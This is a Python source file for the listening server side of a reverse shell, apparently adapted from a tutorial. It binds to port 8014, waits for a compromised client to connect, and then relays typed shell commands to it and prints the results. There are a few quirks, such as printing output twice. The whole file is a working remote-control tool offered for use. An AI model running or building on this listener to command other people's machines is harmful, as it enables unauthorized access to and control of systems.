import socket
import sys
import keyboard
from colorama import Fore
import os


SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8014
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)


clear = lambda: os.system('cls')

def checkkeypress():
    # exit when ESC key press
    if keyboard.read_key() == "esc":
        cmd2 = "type esc"
        client_socket.send(cmd2.encode())
        pass


while True:
    
    checkkeypress()
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if command.lower() == "cls":
        clear()
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    print(output)
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
    checkkeypress()
# close connection to the client
client_socket.close()
# close server connection
s.close()